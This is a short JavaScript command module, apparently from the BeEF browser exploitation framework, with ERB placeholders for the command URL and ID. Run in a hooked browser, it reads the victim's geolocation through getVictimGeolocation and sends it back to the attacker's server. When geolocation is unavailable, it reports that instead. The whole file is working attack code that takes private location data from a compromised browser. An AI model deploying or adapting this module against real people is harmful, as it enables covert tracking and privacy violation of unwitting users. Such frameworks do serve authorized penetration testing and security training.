beef.execute(function() {

    if(beef.geolocation.isGeolocationEnabled()){
        beef.geolocation.getVictimGeolocation("<%= @command_url %>", <%= @command_id %>);
    }else{
        beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "geoLocEnabled=false&latitude=&longitude=");
    }
});

